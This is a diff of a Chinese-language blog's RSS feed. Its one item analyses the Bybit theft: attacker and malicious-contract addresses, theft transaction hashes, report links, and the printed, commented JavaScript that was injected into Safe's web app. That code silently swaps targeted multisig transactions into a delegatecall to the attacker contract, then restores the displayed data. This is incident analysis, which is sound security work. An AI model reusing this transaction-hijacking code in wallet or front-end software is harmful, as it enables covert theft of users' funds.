@@ -1,20 +1,73 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Delegatecall on Passi0n1&#39;s Blog</title>
-    <link>http://localhost:1313/tags/delegatecall/</link>
-    <description>Recent content in Delegatecall on Passi0n1&#39;s Blog</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>zh-cn</language>
-    <copyright>Rise. 本站遵循 CC-BY-NC 4.0 协议</copyright>
-    <lastBuildDate>Tue, 08 Apr 2025 11:25:05 +0000</lastBuildDate>
-    <atom:link href="http://localhost:1313/tags/delegatecall/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Bybit 被盗事件分析</title>
-      <link>http://localhost:1313/posts/vol.2-bybit%E8%A2%AB%E7%9B%97/</link>
-      <pubDate>Tue, 08 Apr 2025 11:25:05 +0000</pubDate>
-      <guid>http://localhost:1313/posts/vol.2-bybit%E8%A2%AB%E7%9B%97/</guid>
-      <description>案件元数据 被盗合约：0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4 初始黑客地址：0x47666fab8bd0ac7003bce3f5c3585383f09486e2 黑客部署的恶意合约1：0x96221423681a6d52e184d440a8efcebb105c7242 黑客部署的恶意合约2：0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516 修改逻辑合约交易：0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882 盗窃交易1：0x25800d105db4f21908d646a7a3db849343737c5fba0bc5701f782bf0e75217c9 盗窃交易2：0xb61413c495fdad6114a7aa863a00b2e3c28945979a10885b12b30316ea9f072c 盗窃交易3：0xbcf316f5835362b7f1586215173cc8b294f5499c60c029a3de6318bf25ca7b20 盗窃交易4：0xa284a1bc4c7e0379c924c73fcea1067068635507254b03ebbbd3f4e222c1fae0 盗窃交易5：0x847b8403e8a4816a4de1e63db321705cdb6f998fb01ab58f653b863fda988647 Safe 事后审计报告：https://archive.ph/OxemM 官方报告（已失效）：https://docsend.com/view/s/rmdi832mpt8u93s7 OneKey 评价：https://x.com/OneKeyCN/status/1894783804512051469 23pd 评价：https://x.com/im23pds/status/1894637152392434013 ScamSniffer 分析：https://x.com/realScamSniffer/status/1894910207052128263 黑客测试交易：https://etherscan.io/tx/0xbe42ca77d43686c822a198c3641f3dadd1edcb5fde22fbc1738b3298a9c25ddb Verichains 报告：https://github.com/verichains/public-audit-reports/blob/main/Bybit%20Incident%20Investigation%20-%20Preliminary%20Report%20v1.0%20(for%20public%20release).pdf Safe 官网存档：https://web.archive.org/web/20250000000000*/safe.global ChromeCacheView 下载地址：https://www.nirsoft.net/utils/chrome_cache_view.html 事件涉及一笔修改合约交易和五笔盗窃交易：&#xA;Safe 合约被篡改的 JS 恶意文件如下：&#xA;恶意存档： https://web.archive.org/web/20250219172905/https://app.safe.global/_next/static/chunks/pages/_app-52c9031bfa03da47.js https://web.archive.org/web/20250219172905/https://app.safe.global/_next/static/chunks/6514.b556851795a4cbaa.js 正常存档： https://web.archive.org/web/20250219111919/https://app.safe.global/_next/static/chunks/pages/_app-52c9031bfa03da47.js https://web.archive.org/web/20250219111919/https://app.safe.global/_next/static/chunks/6514.b556851795a4cbaa.js 注：6514.b556851795a4cbaa.js 文件暂未找到，暂跳过分析。 具体分析 JS 代码分析 以下是被篡改的核心 JS 代码片段：&#xA;let sd = c; // Safe SDK 实例 let se = e; // 交易对象 let st = t; // 交易选项 let wa = [&amp;#34;0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4&amp;#34;, &amp;#34;0x19c6876e978d9f128147439ac4cd9ea2582cd141&amp;#34;]; // 目标 Safe 地址 let ba = [&amp;#34;0x828424517f9f04015db02169f4026d57b2b07229&amp;#34;, &amp;#34;0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97&amp;#34;]; // 目标签名者地址 let ta = &amp;#34;0x96221423681a6d52e184d440a8efcebb105c7242&amp;#34;; // 黑客恶意合约地址 let da = &amp;#34;0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000&amp;#34;; // 恶意数据 let op = 1; // 操作类型（delegatecall） let vl = 0; // 交易价值 let sga = 45746; // Safe 交易 gas 限制 let sf = sd.</description>
-    </item>
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Delegatecall on Passi0n1's Blog</title><link>https://passi0n1.github.io/tags/delegatecall/</link><description>Recent content in Delegatecall on Passi0n1's Blog</description><generator>Hugo</generator><language>zh-cn</language><copyright>Rise. 本站遵循 CC-BY-NC 4.0 协议</copyright><lastBuildDate>Tue, 08 Apr 2025 11:25:05 +0000</lastBuildDate><atom:link href="https://passi0n1.github.io/tags/delegatecall/index.xml" rel="self" type="application/rss+xml"/><item><title>Bybit 被盗事件分析</title><link>https://passi0n1.github.io/posts/vol.2-bybit%E8%A2%AB%E7%9B%97/</link><pubDate>Tue, 08 Apr 2025 11:25:05 +0000</pubDate><guid>https://passi0n1.github.io/posts/vol.2-bybit%E8%A2%AB%E7%9B%97/</guid><description>&lt;h3 id="案件元数据">案件元数据&lt;/h3>
+&lt;pre tabindex="0">&lt;code>被盗合约：0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4
+初始黑客地址：0x47666fab8bd0ac7003bce3f5c3585383f09486e2
+黑客部署的恶意合约1：0x96221423681a6d52e184d440a8efcebb105c7242
+黑客部署的恶意合约2：0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516
+修改逻辑合约交易：0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882
+盗窃交易1：0x25800d105db4f21908d646a7a3db849343737c5fba0bc5701f782bf0e75217c9
+盗窃交易2：0xb61413c495fdad6114a7aa863a00b2e3c28945979a10885b12b30316ea9f072c
+盗窃交易3：0xbcf316f5835362b7f1586215173cc8b294f5499c60c029a3de6318bf25ca7b20
+盗窃交易4：0xa284a1bc4c7e0379c924c73fcea1067068635507254b03ebbbd3f4e222c1fae0
+盗窃交易5：0x847b8403e8a4816a4de1e63db321705cdb6f998fb01ab58f653b863fda988647
+
+Safe 事后审计报告：https://archive.ph/OxemM
+官方报告（已失效）：https://docsend.com/view/s/rmdi832mpt8u93s7
+OneKey 评价：https://x.com/OneKeyCN/status/1894783804512051469
+23pd 评价：https://x.com/im23pds/status/1894637152392434013
+ScamSniffer 分析：https://x.com/realScamSniffer/status/1894910207052128263
+黑客测试交易：https://etherscan.io/tx/0xbe42ca77d43686c822a198c3641f3dadd1edcb5fde22fbc1738b3298a9c25ddb
+Verichains 报告：https://github.com/verichains/public-audit-reports/blob/main/Bybit%20Incident%20Investigation%20-%20Preliminary%20Report%20v1.0%20(for%20public%20release).pdf
+Safe 官网存档：https://web.archive.org/web/20250000000000*/safe.global
+ChromeCacheView 下载地址：https://www.nirsoft.net/utils/chrome_cache_view.html
+&lt;/code>&lt;/pre>&lt;p>事件涉及一笔修改合约交易和五笔盗窃交易：&lt;/p>
+&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/cap20250408235125.png" width="100%">
+&lt;/figure>
+&lt;/center>
+&lt;p>Safe 合约被篡改的 JS 恶意文件如下：&lt;/p>
+&lt;pre tabindex="0">&lt;code>恶意存档：
+https://web.archive.org/web/20250219172905/https://app.safe.global/_next/static/chunks/pages/_app-52c9031bfa03da47.js
+https://web.archive.org/web/20250219172905/https://app.safe.global/_next/static/chunks/6514.b556851795a4cbaa.js
+
+正常存档：
+https://web.archive.org/web/20250219111919/https://app.safe.global/_next/static/chunks/pages/_app-52c9031bfa03da47.js
+https://web.archive.org/web/20250219111919/https://app.safe.global/_next/static/chunks/6514.b556851795a4cbaa.js
+注：6514.b556851795a4cbaa.js 文件暂未找到，暂跳过分析。
+&lt;/code>&lt;/pre>&lt;hr>
+&lt;h2 id="具体分析">具体分析&lt;/h2>
+&lt;h3 id="js-代码分析">JS 代码分析&lt;/h3>
+&lt;p>以下是被篡改的核心 JS 代码片段：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sd = c; &lt;span style="color:#228b22">// Safe SDK 实例
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> se = e; &lt;span style="color:#228b22">// 交易对象
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> st = t; &lt;span style="color:#228b22">// 交易选项
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> wa = [&lt;span style="color:#cd5555">&amp;#34;0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;0x19c6876e978d9f128147439ac4cd9ea2582cd141&amp;#34;&lt;/span>]; &lt;span style="color:#228b22">// 目标 Safe 地址
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> ba = [&lt;span style="color:#cd5555">&amp;#34;0x828424517f9f04015db02169f4026d57b2b07229&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97&amp;#34;&lt;/span>]; &lt;span style="color:#228b22">// 目标签名者地址
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> ta = &lt;span style="color:#cd5555">&amp;#34;0x96221423681a6d52e184d440a8efcebb105c7242&amp;#34;&lt;/span>; &lt;span style="color:#228b22">// 黑客恶意合约地址
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> da = &lt;span style="color:#cd5555">&amp;#34;0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000&amp;#34;&lt;/span>; &lt;span style="color:#228b22">// 恶意数据
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> op = &lt;span style="color:#b452cd">1&lt;/span>; &lt;span style="color:#228b22">// 操作类型（delegatecall）
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> vl = &lt;span style="color:#b452cd">0&lt;/span>; &lt;span style="color:#228b22">// 交易价值
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sga = &lt;span style="color:#b452cd">45746&lt;/span>; &lt;span style="color:#228b22">// Safe 交易 gas 限制
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sf = sd.getSafeProvider();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sa = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sf.getSignerAddress();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sa = sa.toLowerCase();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> lu = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sd.getAddress();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lu = lu.toLowerCase();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> cf = wa.some(k1 =&amp;gt; lu.includes(k1)); &lt;span style="color:#228b22">// 检查是否为目标 Safe 地址
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> cb = ba.some(k1 =&amp;gt; sa.includes(k1)); &lt;span style="color:#228b22">// 检查是否为目标签名者地址
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (cf == &lt;span style="color:#8b008b;font-weight:bold">true&lt;/span> &amp;amp;&amp;amp; se.data.operation == &lt;span style="color:#b452cd">0&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> td = structuredClone(se.data); &lt;span style="color:#228b22">// 保存原始交易数据副本
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.to = ta; &lt;span style="color:#228b22">// 修改目标地址为黑客合约
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.operation = op; &lt;span style="color:#228b22">// 修改为 delegatecall
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.data = da; &lt;span style="color:#228b22">// 设置恶意数据
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.value = vl;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> se.data.safeTxGas = sga;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sd.executeTransaction(se, st); &lt;span style="color:#228b22">// 执行篡改后的交易
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data = td; &lt;span style="color:#228b22">// 恢复原始数据
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> } &lt;span style="color:#8b008b;font-weight:bold">catch&lt;/span> (e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> se.data = td;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">throw&lt;/span> e;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#8b008b;font-weight:bold">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sd.executeTransaction(se, st); &lt;span style="color:#228b22">// 执行原始交易
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Verichains 提供了更清晰的注释版代码，逻辑如下：&lt;/p></description></item></channel></rss>
